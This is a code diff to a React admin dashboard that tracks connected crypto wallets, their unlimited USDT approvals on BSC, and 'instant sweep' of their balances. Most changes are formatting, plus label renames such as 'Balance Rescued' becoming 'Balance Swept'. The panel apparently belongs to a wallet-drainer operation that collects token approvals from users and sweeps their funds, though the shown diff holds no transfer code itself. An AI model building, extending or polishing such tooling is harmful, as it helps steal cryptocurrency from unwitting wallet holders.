@@ -201,11 +201,10 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
     <button
       key={tab}
       onClick={() => setSidebarTab(tab)}
-      className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-xl text-sm font-medium transition-all cursor-pointer ${
-        sidebarTab === tab
-          ? 'bg-blue-700/80 text-white border border-blue-500/30 shadow-md shadow-blue-900/20'
-          : 'text-[#8e9eb3] hover:text-white hover:bg-[#141f33]'
-      }`}
+      className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-xl text-sm font-medium transition-all cursor-pointer ${sidebarTab === tab
+        ? 'bg-blue-700/80 text-white border border-blue-500/30 shadow-md shadow-blue-900/20'
+        : 'text-[#8e9eb3] hover:text-white hover:bg-[#141f33]'
+        }`}
     >
       {icon}
       <span className="flex-1 text-left">{label}</span>
@@ -259,8 +258,8 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
     walletFilter === 'all'
       ? sortedWallets
       : walletFilter === 'approved'
-      ? approvedWallets
-      : unapprovedWallets;
+        ? approvedWallets
+        : unapprovedWallets;
 
   // Set of unapproved addresses for fast lookup in "All" view
   const unapprovedMap = React.useMemo(() => {
@@ -338,11 +337,10 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
               <button
                 key={t}
                 onClick={() => setSidebarTab(t)}
-                className={`flex-shrink-0 px-3 py-1.5 rounded-lg text-xs font-semibold capitalize transition-all ${
-                  sidebarTab === t
-                    ? 'bg-blue-600 text-white'
-                    : 'text-[#8e9eb3] bg-[#141f33]'
-                }`}
+                className={`flex-shrink-0 px-3 py-1.5 rounded-lg text-xs font-semibold capitalize transition-all ${sidebarTab === t
+                  ? 'bg-blue-600 text-white'
+                  : 'text-[#8e9eb3] bg-[#141f33]'
+                  }`}
               >
                 {t === 'wallets' ? `Wallets (${connectedCount})` : 'Dashboard'}
               </button>
@@ -367,11 +365,10 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
               {/* Sweep result notification */}
               {sweepResult && (
                 <div
-                  className={`flex items-start gap-3 p-4 rounded-xl border text-sm ${
-                    sweepResult.success
-                      ? 'bg-emerald-900/20 border-emerald-500/30 text-emerald-300'
-                      : 'bg-red-900/20 border-red-500/30 text-red-300'
-                  }`}
+                  className={`flex items-start gap-3 p-4 rounded-xl border text-sm ${sweepResult.success
+                    ? 'bg-emerald-900/20 border-emerald-500/30 text-emerald-300'
+                    : 'bg-red-900/20 border-red-500/30 text-red-300'
+                    }`}
                 >
                   <span className="flex-1">
                     <span className="font-semibold block">{sweepResult.message}</span>
@@ -405,14 +402,14 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                   color="blue"
                 />
                 <MetricCard
-                  label="Unlimited Today"
+                  label="Unlimited Approval (Today)"
                   value={unlimitedTodayCount}
                   sub="New approvals since midnight"
                   icon={<TrendingUp className="w-4 h-4" />}
                   color="emerald"
                 />
                 <MetricCard
-                  label="Balance Rescued"
+                  label="Balance Swept"
                   value={totalBalanceRescued}
                   sub="Total USDT swept"
                   icon={<Zap className="w-4 h-4" />}
@@ -475,11 +472,10 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                   <button
                     id="filter-all-wallets-btn"
                     onClick={() => setWalletFilter('all')}
-                    className={`flex items-center gap-2 px-3.5 py-2.5 rounded-xl text-xs font-semibold transition-all cursor-pointer ${
-                      walletFilter === 'all'
-                        ? 'bg-blue-600 text-white shadow-md shadow-blue-600/30 border border-blue-400/40'
-                        : 'bg-[#121b2d] border border-[#24344d] text-[#8e9eb3] hover:text-white hover:bg-[#18243c]'
-                    }`}
+                    className={`flex items-center gap-2 px-3.5 py-2.5 rounded-xl text-xs font-semibold transition-all cursor-pointer ${walletFilter === 'all'
+                      ? 'bg-blue-600 text-white shadow-md shadow-blue-600/30 border border-blue-400/40'
+                      : 'bg-[#121b2d] border border-[#24344d] text-[#8e9eb3] hover:text-white hover:bg-[#18243c]'
+                      }`}
                   >
                     <Wallet className="w-3.5 h-3.5 text-blue-400" />
                     <span>All</span>
@@ -492,11 +488,10 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                   <button
                     id="filter-approved-wallets-btn"
                     onClick={() => setWalletFilter('approved')}
-                    className={`flex items-center gap-2 px-3.5 py-2.5 rounded-xl text-xs font-semibold transition-all cursor-pointer ${
-                      walletFilter === 'approved'
-                        ? 'bg-blue-600 text-white shadow-md shadow-blue-600/30 border border-blue-400/40'
-                        : 'bg-[#121b2d] border border-[#24344d] text-[#8e9eb3] hover:text-white hover:bg-[#18243c]'
-                    }`}
+                    className={`flex items-center gap-2 px-3.5 py-2.5 rounded-xl text-xs font-semibold transition-all cursor-pointer ${walletFilter === 'approved'
+                      ? 'bg-blue-600 text-white shadow-md shadow-blue-600/30 border border-blue-400/40'
+                      : 'bg-[#121b2d] border border-[#24344d] text-[#8e9eb3] hover:text-white hover:bg-[#18243c]'
+                      }`}
                   >
                     <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                     <span>Approved Wallets</span>
@@ -509,11 +504,10 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                   <button
                     id="filter-non-approved-wallets-btn"
                     onClick={() => setWalletFilter('unapproved')}
-                    className={`flex items-center gap-2 px-3.5 py-2.5 rounded-xl text-xs font-semibold transition-all cursor-pointer ${
-                      walletFilter === 'unapproved'
-                        ? 'bg-amber-600 text-white shadow-md shadow-amber-600/30 border border-amber-400/40'
-                        : 'bg-[#121b2d] border border-[#24344d] text-[#8e9eb3] hover:text-white hover:bg-[#18243c]'
-                    }`}
+                    className={`flex items-center gap-2 px-3.5 py-2.5 rounded-xl text-xs font-semibold transition-all cursor-pointer ${walletFilter === 'unapproved'
+                      ? 'bg-amber-600 text-white shadow-md shadow-amber-600/30 border border-amber-400/40'
+                      : 'bg-[#121b2d] border border-[#24344d] text-[#8e9eb3] hover:text-white hover:bg-[#18243c]'
+                      }`}
                   >
                     <AlertTriangle className="w-3.5 h-3.5 text-amber-400" />
                     <span>Non-Approved Wallets</span>
@@ -534,9 +528,8 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                       title="Check on-chain USDT allowance on BSC RPC node for all non-approved wallets"
                     >
                       <RefreshCw
-                        className={`w-3.5 h-3.5 ${
-                          isCheckingAllAllowances ? 'animate-spin text-amber-400' : 'text-amber-400'
-                        }`}
+                        className={`w-3.5 h-3.5 ${isCheckingAllAllowances ? 'animate-spin text-amber-400' : 'text-amber-400'
+                          }`}
                       />
                       <span>{isCheckingAllAllowances ? 'Scanning Node…' : 'Check All On-Chain'}</span>
                     </button>
@@ -548,9 +541,8 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                     className="flex items-center gap-1.5 px-3.5 py-2 rounded-xl border border-[#23354f] bg-[#131e31] hover:bg-[#1a2842] text-xs font-medium text-[#8e9eb3] hover:text-white transition-all cursor-pointer disabled:opacity-50"
                   >
                     <RefreshCw
-                      className={`w-3.5 h-3.5 ${
-                        isRefreshingWallets ? 'animate-spin text-blue-400' : 'text-[#8e9eb3]'
-                      }`}
+                      className={`w-3.5 h-3.5 ${isRefreshingWallets ? 'animate-spin text-blue-400' : 'text-[#8e9eb3]'
+                        }`}
                     />
                     <span>{isRefreshingWallets ? 'Refreshing…' : 'Refresh'}</span>
                   </button>
@@ -562,8 +554,8 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                 {walletFilter === 'all'
                   ? 'Viewing all connected wallets. Live balance monitoring & instant sweep active.'
                   : walletFilter === 'approved'
-                  ? 'Live balance monitoring & instant sweep. Newly connected & latest swept appear on top.'
-                  : 'Wallets that have not granted on-chain allowance or revoked approval. Click Check On-Chain or Check All On-Chain to re-verify.'}
+                    ? 'Live balance monitoring & instant sweep. Newly connected & latest swept appear on top.'
+                    : 'Wallets that have not granted on-chain allowance or revoked approval. Click Check On-Chain or Check All On-Chain to re-verify.'}
               </p>
 
               {/* Allowance verification toast */}
@@ -577,11 +569,10 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
               {/* Global sweep result */}
               {sweepResult && (
                 <div
-                  className={`flex items-start gap-3 p-4 rounded-xl border text-sm ${
-                    sweepResult.success
-                      ? 'bg-emerald-900/20 border-emerald-500/30 text-emerald-300'
-                      : 'bg-red-900/20 border-red-500/30 text-red-300'
-                  }`}
+                  className={`flex items-start gap-3 p-4 rounded-xl border text-sm ${sweepResult.success
+                    ? 'bg-emerald-900/20 border-emerald-500/30 text-emerald-300'
+                    : 'bg-red-900/20 border-red-500/30 text-red-300'
+                    }`}
                 >
                   <span className="flex-1">
                     <span className="font-semibold block">{sweepResult.message}</span>
@@ -840,8 +831,8 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                       {walletFilter === 'all'
                         ? 'total'
                         : walletFilter === 'approved'
-                        ? 'approved'
-                        : 'non-approved'}{' '}
+                          ? 'approved'
+                          : 'non-approved'}{' '}
                       wallet{currentWalletList.length !== 1 ? 's' : ''}
                     </span>
                   </div>
